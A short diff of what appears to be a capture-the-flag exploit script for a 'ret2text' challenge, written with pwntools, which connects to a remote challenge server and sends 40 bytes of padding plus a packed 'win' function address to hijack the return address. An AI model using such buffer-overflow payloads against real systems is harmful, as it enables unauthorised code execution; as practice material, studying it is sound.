@@ -16,11 +16,13 @@ from pwn import *
 #local
 #sh = process("./ret2text")
 #remote
-sh=remote('3.110.66.92',31865)
-win = 0x8049182
-sh.sendline(b'A'*40 + p32(win))
-sh.interactive()
+sh=remote('3.110.66.92',32075)
+win = 0x4017E53
+sh.sendline(b'A'*40 + p64(win))
+sh.recvline()         
 ```
+
+
 
 
 
